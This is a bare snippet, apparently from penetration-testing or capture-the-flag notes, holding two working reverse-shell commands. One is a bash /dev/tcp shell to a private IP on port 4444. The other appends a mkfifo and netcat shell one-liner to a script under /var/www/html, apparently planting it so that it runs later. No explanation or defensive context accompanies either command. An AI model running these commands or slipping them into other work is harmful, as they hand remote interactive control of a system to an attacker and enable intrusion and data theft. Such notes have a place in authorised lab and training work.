```bash
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
```

```zsh
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.240 1234 >/tmp/f"  >> /var/www/html/write.sh
```

